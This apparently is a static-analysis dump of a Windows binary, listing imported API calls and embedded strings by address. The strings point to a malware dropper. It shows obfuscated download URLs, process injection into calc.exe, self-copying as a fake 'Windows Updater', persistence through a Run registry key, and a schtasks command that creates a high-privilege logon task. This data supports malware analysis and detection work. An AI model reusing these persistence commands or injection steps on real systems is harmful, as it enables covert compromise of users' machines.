reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x406ae6	0x401170	import	0x4068b0	KERNEL32.dll.lstrcatA
0x406b06	0x40110c	import	0x4068b0	KERNEL32.dll.SetCurrentDirectoryA
0x406b2d	0x4011d8	import	0x4068b0	SHELL32.dll.SHGetSpecialFolderPathA
0x406b33	0x401b88	string	0x4068b0	\Identities
0x406b3f	0x401170	import	0x4068b0	KERNEL32.dll.lstrcatA
0x406b5f	0x40110c	import	0x4068b0	KERNEL32.dll.SetCurrentDirectoryA
0x406b8f	0x4011d8	import	0x4068b0	SHELL32.dll.SHGetSpecialFolderPathA
0x406ba4	0x4011d8	import	0x4068b0	SHELL32.dll.SHGetSpecialFolderPathA
0x406bc4	0x40110c	import	0x4068b0	KERNEL32.dll.SetCurrentDirectoryA
0x406beb	0x4011d8	import	0x4068b0	SHELL32.dll.SHGetSpecialFolderPathA
0x406c0b	0x40110c	import	0x4068b0	KERNEL32.dll.SetCurrentDirectoryA
0x406c32	0x4011d8	import	0x4068b0	SHELL32.dll.SHGetSpecialFolderPathA
0x406c52	0x40110c	import	0x4068b0	KERNEL32.dll.SetCurrentDirectoryA
0x406c79	0x4011d8	import	0x4068b0	SHELL32.dll.SHGetSpecialFolderPathA
0x406c99	0x40110c	import	0x4068b0	KERNEL32.dll.SetCurrentDirectoryA
0x406cc0	0x4011d8	import	0x4068b0	SHELL32.dll.SHGetSpecialFolderPathA
0x406ce0	0x40110c	import	0x4068b0	KERNEL32.dll.SetCurrentDirectoryA
0x406d06	0x401108	import	0x4068b0	KERNEL32.dll.GetTempPathA
0x406d13	0x401180	import	0x4068b0	KERNEL32.dll.lstrlenA
0x406d47	0x40110c	import	0x4068b0	KERNEL32.dll.SetCurrentDirectoryA
0x406d98	0x401110	import	0x406d70	KERNEL32.dll.GetCurrentDirectoryA
0x406dac	0x4010d0	import	0x406d70	KERNEL32.dll.GetModuleFileNameA
0x406dc8	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x406ddd	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x406de3	0x401b94	string	0x406d70	\bett2f002
0x406def	0x401170	import	0x406d70	KERNEL32.dll.lstrcatA
0x406e0f	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x406e42	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x406e48	0x401ba0	string	0x406d70	\Microsoft\Windows
0x406e54	0x401170	import	0x406d70	KERNEL32.dll.lstrcatA
0x406e74	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x406e9b	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x406ea1	0x401bb4	string	0x406d70	\Microsoft
0x406ead	0x401170	import	0x406d70	KERNEL32.dll.lstrcatA
0x406ecd	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x406ef4	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x406efa	0x401bc0	string	0x406d70	\bett2f002
0x406f06	0x401170	import	0x406d70	KERNEL32.dll.lstrcatA
0x406f26	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x406f4d	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x406f53	0x401bcc	string	0x406d70	\CreativeAudio
0x406f5f	0x401170	import	0x406d70	KERNEL32.dll.lstrcatA
0x406f7f	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x406fa6	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x406fac	0x401bdc	string	0x406d70	\Identities
0x406fb8	0x401170	import	0x406d70	KERNEL32.dll.lstrcatA
0x406fd8	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x407008	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x40701d	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x40703d	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x407064	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x407084	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x4070ab	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x4070cb	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x4070f2	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x407112	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x407139	0x4011d8	import	0x406d70	SHELL32.dll.SHGetSpecialFolderPathA
0x407159	0x40110c	import	0x406d70	KERNEL32.dll.SetCurrentDirectoryA
0x4071b9	0x4011e4	import	0x407180	SHELL32.dll.SHGetFolderPathA
0x4071bf	0x401be8	string	0x407180	\Microsoft
0x4071cb	0x401170	import	0x407180	KERNEL32.dll.lstrcatA
0x4071d8	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407214	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x407221	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407260	0x4011e4	import	0x407180	SHELL32.dll.SHGetFolderPathA
0x407266	0x401bf4	string	0x407180	\Identities
0x407272	0x401170	import	0x407180	KERNEL32.dll.lstrcatA
0x40727f	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x4072bb	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x4072c8	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407304	0x401c00	string	0x407180	ALLUSERSPROFILE
0x407309	0x4010a8	import	0x407180	KERNEL32.dll.GetEnvironmentVariableA
0x407316	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407352	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x40735f	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x40739e	0x4011e4	import	0x407180	SHELL32.dll.SHGetFolderPathA
0x4073ab	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x4073e7	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x4073f4	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407460	0x401c10	string	0x407180	%s\Program Files\Common Files
0x40746c	0x401238	import	0x407180	USER32.dll.wsprintfA
0x407475	0x401c30	string	0x407180	\bett2f002
0x407481	0x401170	import	0x407180	KERNEL32.dll.lstrcatA
0x407493	0x401088	import	0x407180	KERNEL32.dll.SetFileAttributesA
0x4074a7	0x40117c	import	0x407180	KERNEL32.dll.lstrcpyA
0x4074b4	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x4074d5	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x4074e6	0x401200	import	0x407180	SHLWAPI.dll.StrRChrA
0x407508	0x401180	import	0x407180	KERNEL32.dll.lstrlenA
0x40752c	0x401078	import	0x407180	KERNEL32.dll.MoveFileA
0x407532	0x4011a0	import	0x407180	KERNEL32.dll.GetLastError
0x407551	0x401238	import	0x407180	USER32.dll.wsprintfA
0x407561	0x401c40	string	0x407180	%s\programdata
0x40756d	0x401238	import	0x407180	USER32.dll.wsprintfA
0x407576	0x401c50	string	0x407180	\bett2f002
0x407582	0x401170	import	0x407180	KERNEL32.dll.lstrcatA
0x407594	0x401088	import	0x407180	KERNEL32.dll.SetFileAttributesA
0x4075a8	0x40117c	import	0x407180	KERNEL32.dll.lstrcpyA
0x4075b5	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407621	0x401c5c	string	0x407180	%s\Program Files\Common Files
0x40762d	0x401238	import	0x407180	USER32.dll.wsprintfA
0x407636	0x401c7c	string	0x407180	\CreativeAudio
0x407642	0x401170	import	0x407180	KERNEL32.dll.lstrcatA
0x407654	0x401088	import	0x407180	KERNEL32.dll.SetFileAttributesA
0x407668	0x40117c	import	0x407180	KERNEL32.dll.lstrcpyA
0x407675	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407696	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x4076a7	0x401200	import	0x407180	SHLWAPI.dll.StrRChrA
0x4076c9	0x401180	import	0x407180	KERNEL32.dll.lstrlenA
0x4076ed	0x401078	import	0x407180	KERNEL32.dll.MoveFileA
0x4076f3	0x4011a0	import	0x407180	KERNEL32.dll.GetLastError
0x407712	0x401238	import	0x407180	USER32.dll.wsprintfA
0x407722	0x401c90	string	0x407180	%s\programdata
0x40772e	0x401238	import	0x407180	USER32.dll.wsprintfA
0x407737	0x401ca0	string	0x407180	\CreativeAudio
0x407743	0x401170	import	0x407180	KERNEL32.dll.lstrcatA
0x407755	0x401088	import	0x407180	KERNEL32.dll.SetFileAttributesA
0x407769	0x40117c	import	0x407180	KERNEL32.dll.lstrcpyA
0x407776	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407797	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x4077a8	0x401200	import	0x407180	SHLWAPI.dll.StrRChrA
0x4077ca	0x401180	import	0x407180	KERNEL32.dll.lstrlenA
0x4077ee	0x401078	import	0x407180	KERNEL32.dll.MoveFileA
0x4077f4	0x4011a0	import	0x407180	KERNEL32.dll.GetLastError
0x407813	0x401238	import	0x407180	USER32.dll.wsprintfA
0x407841	0x4011e4	import	0x407180	SHELL32.dll.SHGetFolderPathA
0x40784e	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x40788a	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x407897	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x4078d3	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x4078d9	0x401cb4	string	0x407180	\adobe
0x4078e5	0x401170	import	0x407180	KERNEL32.dll.lstrcatA
0x4078f2	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x40792e	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x40793b	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x40797a	0x4011e4	import	0x407180	SHELL32.dll.SHGetFolderPathA
0x407987	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x4079c3	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x4079d0	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407a0f	0x4011e4	import	0x407180	SHELL32.dll.SHGetFolderPathA
0x407a1c	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407a58	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x407a65	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407aa4	0x4011e4	import	0x407180	SHELL32.dll.SHGetFolderPathA
0x407ab1	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407aed	0x401108	import	0x407180	KERNEL32.dll.GetTempPathA
0x407afa	0x40110c	import	0x407180	KERNEL32.dll.SetCurrentDirectoryA
0x407b55	0x40117c	import	0x407b20	KERNEL32.dll.lstrcpyA
0x407b62	0x401180	import	0x407b20	KERNEL32.dll.lstrlenA
0x407bbc	0x401cc0	string	0x407b20	*.exe
0x407bc1	0x401174	import	0x407b20	KERNEL32.dll.FindFirstFileA
0x407be9	0x40107c	import	0x407b20	KERNEL32.dll.lstrcmpA
0x407c17	0x40117c	import	0x407b20	KERNEL32.dll.lstrcpyA
0x407c1d	0x401cc8	string	0x407b20	.gonewiththewings
0x407c29	0x401170	import	0x407b20	KERNEL32.dll.lstrcatA
0x407c3f	0x4010a4	import	0x407b20	KERNEL32.dll.MoveFileExA
0x407c51	0x401088	import	0x407b20	KERNEL32.dll.SetFileAttributesA
0x407c65	0x401184	import	0x407b20	KERNEL32.dll.FindNextFileA
0x407c90	0x401cdc	string	0x407c80	*.gonewiththewings
0x407c95	0x401174	import	0x407c80	KERNEL32.dll.FindFirstFileA
0x407cb3	0x401084	import	0x407c80	KERNEL32.dll.DeleteFileA
0x407cc7	0x401184	import	0x407c80	KERNEL32.dll.FindNextFileA
0x407e91	0x401180	import	0x407e80	KERNEL32.dll.lstrlenA
0x407ea3	0x40117c	import	0x407e80	KERNEL32.dll.lstrcpyA
0x40865b	0x401cf0	string	0x408650	kernel32.dll
0x408660	0x40118c	import	0x408650	KERNEL32.dll.GetModuleHandleA
0x40867b	0x401d00	string	0x408650	abcdefghijklmnopqrstuvwxyz0123456789
0x408696	0x401198	import	0x408650	KERNEL32.dll.SetLastError
0x40869c	0x401d28	string	0x408650	SSLOADasdasc000900
0x4086a5	0x40119c	import	0x408650	KERNEL32.dll.CreateMutexA
0x4086ab	0x4011a0	import	0x408650	KERNEL32.dll.GetLastError
0x4086ba	0x40111c	import	0x408650	KERNEL32.dll.ExitThread
0x408716	0x401d3c	string	0x408650	CloseHandle
0x408722	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x40872e	0x401d48	string	0x408650	CreateFileA
0x40873a	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x408746	0x401d54	string	0x408650	DeleteFileA
0x408752	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x40875e	0x401d60	string	0x408650	ExitProcess
0x40876a	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x408776	0x401d6c	string	0x408650	GetFileSize
0x408782	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x40878e	0x401d78	string	0x408650	GetProcAddress
0x40879a	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x4087a6	0x401d88	string	0x408650	GetSystemTime
0x4087b2	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x4087be	0x401d98	string	0x408650	GetTempPathA
0x4087ca	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x4087d6	0x401da8	string	0x408650	LoadLibraryA
0x4087e2	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x4087ee	0x401db8	string	0x408650	lstrcatA
0x4087fa	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x408806	0x401dc4	string	0x408650	lstrlenA
0x408812	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x40881e	0x401dd0	string	0x408650	ReadFile
0x40882a	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x408836	0x401ddc	string	0x408650	SetFileAttributesA
0x408842	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x40884e	0x401df0	string	0x408650	WinExec
0x40885a	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x408866	0x401df8	string	0x408650	WriteFile
0x408872	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x40887e	0x401e04	string	0x408650	Sleep
0x40888a	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x408896	0x401e0c	string	0x408650	GetLastError
0x4088a2	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x4088ae	0x401e1c	string	0x408650	CreateMutexA
0x4088ba	0x401190	import	0x408650	KERNEL32.dll.GetProcAddress
0x4088d2	0x401108	import	0x408650	KERNEL32.dll.GetTempPathA
0x4088d8	0x401e2c	string	0x408650	c731200
0x4088e4	0x401170	import	0x408650	KERNEL32.dll.lstrcatA
0x4088f6	0x401108	import	0x408650	KERNEL32.dll.GetTempPathA
0x408908	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x40890e	0x401e38	string	0x408650	user32.dll
0x40891a	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408920	0x401e44	string	0x408650	urlmon.dll
0x40892c	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408932	0x401e50	string	0x408650	wsprintfA
0x40893e	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408944	0x401e5c	string	0x408650	URLDownloadToFileA
0x408950	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408956	0x401e70	string	0x408650	wininet.dll
0x408962	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408968	0x401e7c	string	0x408650	InternetCheckConnectionA
0x408974	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x40897a	0x401e98	string	0x408650	http://www.google.com
0x408986	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408993	0x4010a0	import	0x408650	KERNEL32.dll.GetTickCount
0x4089f7	0x401180	import	0x408650	KERNEL32.dll.lstrlenA
0x408a17	0x401eb0	string	0x408650	.exe
0x408a23	0x401170	import	0x408650	KERNEL32.dll.lstrcatA
0x408a3e	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408a49	0x401eb8	string	0x408650	c731200
0x408a55	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408a5b	0x401ec0	string	0x408650	9EEAi^^2A:`]H:A>2?:2]4@>]H:A>D4]CF^2A:`]8:7
0x408a67	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408a6d	0x401eec	string	0x408650	9EEAi^^2A:a]H:A>2?:2]4@>]H:A>D4]CF^2A:a]8:7
0x408a79	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408a7f	0x401f18	string	0x408650	9EEAi^^2A:b]H:A>2?:2]4@>]H:A>D4]CF^2A:b]8:7
0x408a8b	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408a91	0x401f44	string	0x408650	9EEAi^^2A:c]H:A>2?:2]4@>]H:A>D4]CF^2A:c]8:7
0x408a9d	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408aa3	0x401f70	string	0x408650	9EEAi^^2A:d]H:A>2?:2]4@>]H:A>D4]CF^2A:d]8:7
0x408aaf	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408ab5	0x401f9c	string	0x408650	9EEAi^^2A:e]H:A>2?:2]4@>]H:A>D4]CF^2A:e]8:7
0x408ac1	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408ac7	0x401fc8	string	0x408650	9EEAi^^2A:f]H:A>2?:2]4@>]H:A>D4]CF^2A:f]8:7
0x408ad3	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408ad9	0x401ff4	string	0x408650	9EEAi^^2A:g]H:A>2?:2]4@>]H:A>D4]CF^2A:g]8:7
0x408ae5	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408aeb	0x402020	string	0x408650	9EEAi^^2A:h]H:A>2?:2]4@>]H:A>D4]CF^2A:h]8:7
0x408af7	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408afd	0x40204c	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]7@H5_]CF^2A:]8:7
0x408b09	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b0f	0x402078	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]D6=7>8`]CF^2A:]8:7
0x408b1b	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b21	0x4020a4	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]=@EFDda]CF^2A:]8:7
0x408b2d	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b33	0x4020d0	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]H:A>2?:2]CF^{<HpIs]8:7
0x408b3f	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b45	0x402100	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]=@EJD]CF^Gy@yp:]8:7
0x408b51	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b57	0x40212c	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]3H2ED]CF^~7;%|6]8:7
0x408b63	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b69	0x402158	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]DE4FD]CF^2A$!9G]8:7
0x408b75	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b7b	0x402184	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]4>@6?b]CF^K<>4w|]8:7
0x408b87	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b8d	0x4021b4	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]2CE34@?b]CF^7C7{6r]8:7
0x408b99	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408b9f	0x4021e4	string	0x408650	9EEAi^^2A:]H:A>2?:2]4@>]J6=@E@]CF^KHu|Hs]8:7
0x408bab	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408bb1	0x402214	string	0x408650	9EEAi^^FA52E6]H:A>2?:2]4@>]C2F=9@DE]CF^=@8@]8:7
0x408bbd	0x40117c	import	0x408650	KERNEL32.dll.lstrcpyA
0x408c00	0x4011e4	import	0x408650	SHELL32.dll.SHGetFolderPathA
0x408c06	0x402244	string	0x408650	\calc.exe
0x408c10	0x401170	import	0x408650	KERNEL32.dll.lstrcatA
0x408c34	0x401118	import	0x408650	KERNEL32.dll.CreateProcessA
0x408c6a	0x40109c	import	0x408650	KERNEL32.dll.VirtualAllocEx
0x408ccd	0x401098	import	0x408650	KERNEL32.dll.WriteProcessMemory
0x408cf8	0x401098	import	0x408650	KERNEL32.dll.WriteProcessMemory
0x408d36	0x401094	import	0x408650	KERNEL32.dll.CreateRemoteThread
0x408d56	0x4010fc	import	0x408650	KERNEL32.dll.WaitForSingleObject
0x408d6a	0x401114	import	0x408650	KERNEL32.dll.GetExitCodeThread
0x408e54	0x40117c	import	0x408e40	KERNEL32.dll.lstrcpyA
0x408e66	0x402250	string	0x408e40	APPDATA
0x408e6b	0x4010a8	import	0x408e40	KERNEL32.dll.GetEnvironmentVariableA
0x408e7f	0x40117c	import	0x408e40	KERNEL32.dll.lstrcpyA
0x408e85	0x402258	string	0x408e40	\WindowsUpdate\Updater.exe
0x408e91	0x401170	import	0x408e40	KERNEL32.dll.lstrcatA
0x408ea5	0x40117c	import	0x408e40	KERNEL32.dll.lstrcpyA
0x408eab	0x402274	string	0x408e40	\c731200
0x408eb7	0x401170	import	0x408e40	KERNEL32.dll.lstrcatA
0x408ed6	0x401080	import	0x408e40	KERNEL32.dll.CreateFileA
0x408efb	0x401070	import	0x408e40	KERNEL32.dll.CopyFileA
0x408f11	0x401070	import	0x408e40	KERNEL32.dll.CopyFileA
0x408f20	0x401160	import	0x408e40	KERNEL32.dll.CloseHandle
0x408f36	0x401070	import	0x408e40	KERNEL32.dll.CopyFileA
0x408f41	0x4011b0	import	0x408e40	KERNEL32.dll.Sleep
0x408fa3	0x401090	import	0x408f90	KERNEL32.dll.GetCurrentProcess
0x408faa	0x401014	import	0x408f90	ADVAPI32.dll.OpenProcessToken
0x408fc8	0x401018	import	0x408f90	ADVAPI32.dll.GetTokenInformation
0x408fd6	0x401160	import	0x408f90	KERNEL32.dll.CloseHandle
0x408fe4	0x401160	import	0x408f90	KERNEL32.dll.CloseHandle
0x409023	0x401124	import	0x409000	KERNEL32.dll.GetWindowsDirectoryA
0x409037	0x40117c	import	0x409000	KERNEL32.dll.lstrcpyA
0x40903d	0x402280	string	0x409000	\System32
0x409049	0x401170	import	0x409000	KERNEL32.dll.lstrcatA
0x40904f	0x40228c	string	0x409000	\System32\schtasks.exe
0x40905b	0x401170	import	0x409000	KERNEL32.dll.lstrcatA
0x409070	0x4011e4	import	0x409000	SHELL32.dll.SHGetFolderPathA
0x409076	0x4022a4	string	0x409000	\WindowsUpdate\Updater.exe
0x409082	0x401170	import	0x409000	KERNEL32.dll.lstrcatA
0x4090bc	0x4022c0	string	0x409000	"%s" /query /tn "Windows Updater"
0x4090c8	0x401238	import	0x409000	USER32.dll.wsprintfA
0x4090f1	0x401118	import	0x409000	KERNEL32.dll.CreateProcessA
0x409100	0x4010fc	import	0x409000	KERNEL32.dll.WaitForSingleObject
0x409114	0x401120	import	0x409000	KERNEL32.dll.GetExitCodeProcess
0x409121	0x401160	import	0x409000	KERNEL32.dll.CloseHandle
0x409140	0x4022e8	string	0x409000	"%s" /CREATE /SC ONLOGON /TN "Windows Updater" /TR "%s" /RL HIGHEST
0x40914c	0x401238	import	0x409000	USER32.dll.wsprintfA
0x409175	0x401118	import	0x409000	KERNEL32.dll.CreateProcessA
0x409184	0x4010fc	import	0x409000	KERNEL32.dll.WaitForSingleObject
0x409191	0x401160	import	0x409000	KERNEL32.dll.CloseHandle
0x4091c3	0x401124	import	0x4091a0	KERNEL32.dll.GetWindowsDirectoryA
0x4091d7	0x40117c	import	0x4091a0	KERNEL32.dll.lstrcpyA
0x4091dd	0x40232c	string	0x4091a0	\System32
0x4091e9	0x401170	import	0x4091a0	KERNEL32.dll.lstrcatA
0x4091ef	0x402338	string	0x4091a0	\System32\schtasks.exe
0x4091fb	0x401170	import	0x4091a0	KERNEL32.dll.lstrcatA
0x409235	0x402350	string	0x4091a0	"%s" /delete /tn "Windows Update Check - 0x05860166" /f
0x409241	0x401238	import	0x4091a0	USER32.dll.wsprintfA
0x40926a	0x401118	import	0x4091a0	KERNEL32.dll.CreateProcessA
0x409279	0x4010fc	import	0x4091a0	KERNEL32.dll.WaitForSingleObject
0x409286	0x401160	import	0x4091a0	KERNEL32.dll.CloseHandle
0x409293	0x402388	string	0x4091a0	"%s" /delete /tn "Windows Update Check - 0x0E7302EC" /f
0x40929f	0x401238	import	0x4091a0	USER32.dll.wsprintfA
0x4092c8	0x401118	import	0x4091a0	KERNEL32.dll.CreateProcessA
0x4092d7	0x4010fc	import	0x4091a0	KERNEL32.dll.WaitForSingleObject
0x4092e4	0x401160	import	0x4091a0	KERNEL32.dll.CloseHandle
0x4092f1	0x4023c0	string	0x4091a0	"%s" /delete /tn "Windows Update Check - 0x5C000766" /f
0x4092fd	0x401238	import	0x4091a0	USER32.dll.wsprintfA
0x409326	0x401118	import	0x4091a0	KERNEL32.dll.CreateProcessA
0x409335	0x4010fc	import	0x4091a0	KERNEL32.dll.WaitForSingleObject
0x409342	0x401160	import	0x4091a0	KERNEL32.dll.CloseHandle
0x40934f	0x4023f8	string	0x4091a0	"%s" /delete /tn "Windows Update Check - 0x6E0A0825" /f
0x40935b	0x401238	import	0x4091a0	USER32.dll.wsprintfA
0x409384	0x401118	import	0x4091a0	KERNEL32.dll.CreateProcessA
0x409393	0x4010fc	import	0x4091a0	KERNEL32.dll.WaitForSingleObject
0x4093a0	0x401160	import	0x4091a0	KERNEL32.dll.CloseHandle
0x4093ad	0x402430	string	0x4091a0	"%s" /delete /tn "Windows Debugger" /f
0x4093b9	0x401238	import	0x4091a0	USER32.dll.wsprintfA
0x4093e2	0x401118	import	0x4091a0	KERNEL32.dll.CreateProcessA
0x4093f1	0x4010fc	import	0x4091a0	KERNEL32.dll.WaitForSingleObject
0x4093fe	0x401160	import	0x4091a0	KERNEL32.dll.CloseHandle
0x409425	0x402458	string	0x409410	APPDATA
0x40942a	0x4010a8	import	0x409410	KERNEL32.dll.GetEnvironmentVariableA
0x409430	0x402460	string	0x409410	\WindowsUpdate\Updater.exe
0x40943c	0x401170	import	0x409410	KERNEL32.dll.lstrcatA
0x40945d	0x40247c	string	0x409410	SOFTWARE\Microsoft\Windows\CurrentVersion\Run
0x409467	0x401004	import	0x409410	ADVAPI32.dll.RegCreateKeyExA
0x409488	0x401180	import	0x409410	KERNEL32.dll.lstrlenA
0x40949d	0x4024ac	string	0x409410	Windows Update Installer
0x4094a9	0x401008	import	0x409410	ADVAPI32.dll.RegSetValueExA
